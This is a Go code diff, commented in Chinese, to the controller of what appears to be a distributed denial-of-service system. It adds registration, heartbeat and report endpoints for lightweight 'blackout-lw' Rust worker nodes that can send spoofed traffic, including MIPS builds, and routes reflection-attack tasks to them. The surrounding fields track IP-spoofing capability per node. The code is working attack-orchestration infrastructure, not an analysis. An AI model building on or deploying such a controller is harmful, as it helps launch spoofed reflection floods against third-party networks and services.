@@ -49,6 +49,8 @@ type NodeInfo struct {
 	// 探测验证成功 → SpoofTested=true, CanSpoof=true。
 	CanSpoof    bool `json:"can_spoof"`
 	SpoofTested bool `json:"spoof_tested"`
+	// Platform 平台标识（lw 节点：os-arch，如 "linux-mipsel"；Go worker 留空）
+	Platform string `json:"platform,omitempty"`
 }
 
 type SubAttackInfo struct {
@@ -534,6 +536,10 @@ func (c *Ctrl) Start() error {
 	mux.HandleFunc("/api/templates", c.authHTTP(c.handleTemplates))
 	mux.HandleFunc("/api/guard", c.guardHandler())
 	mux.HandleFunc("/api/audit", c.authAdmin(c.handleAudit))
+	// 轻量伪造 Worker（blackout-lw Rust 节点）接入
+	mux.HandleFunc("/api/lw/register", c.authHTTP(c.handleLWRegister))
+	mux.HandleFunc("/api/lw/heartbeat", c.authHTTP(c.handleLWHeartbeat))
+	mux.HandleFunc("/api/lw/report", c.authHTTP(c.handleLWReport))
 	mux.HandleFunc("/api/logs", c.authHTTP(c.handleLogs))
 	mux.HandleFunc("/api/logs/stats", c.authHTTP(c.handleLogStats))
 	mux.HandleFunc("/api/logs/", c.authHTTP(c.handleLogs))
@@ -872,6 +878,11 @@ func (c *Ctrl) Heartbeat(ctx context.Context, req *pb.HeartbeatRequest) (*pb.Hea
 		}
 		// 任务指定了参与节点：非选中节点跳过（不派发也不计入完成判定）
 		if len(t.SelectedWorkers) > 0 && !containsStr(t.SelectedWorkers, req.WorkerId) {
+			rem = append(rem, tid)
+			continue
+		}
+		// lw 节点只参与反射任务（非反射任务跳过；lw 走 HTTP 心跳，此处为保险）
+		if !isReflectorTaskMethod(t.Method) && c.isLWNode(req.WorkerId) {
 			rem = append(rem, tid)
 			continue
 		}
@@ -1279,12 +1290,18 @@ func (c *Ctrl) listNodesLocked() []*NodeInfo {
 // 返回 true 表示当前所有在线（非 OFFLINE）目标 Worker 都已领取该 task，
 // 即 pending 派发窗口已覆盖全部可用 Worker，可翻转为 running。
 // 任务指定 SelectedWorkers 时只统计选中节点；未指定时统计全部在线节点。
+// 反射任务包含 lw 节点（lw 只参与反射）；非反射任务排除 lw 节点。
 // 若当前没有任何在线目标 Worker，则要求 task 至少已派给一个 Worker 才算完成
 // （避免在零在线节点时把刚创建、还没派发的 task 直接翻转）。
 func (c *Ctrl) onlineWorkersAllAssigned(t *TaskInfo) bool {
+	reflectorTask := isReflectorTaskMethod(t.Method)
 	onlineCount := 0
 	for id, n := range c.nodes {
 		if n.Status == "OFFLINE" {
+			continue
+		}
+		// 非反射任务：lw 节点不参与（lw 只跑反射）
+		if !reflectorTask && c.isLWNode(id) {
 			continue
 		}
 		// 任务指定了参与节点：只统计选中的
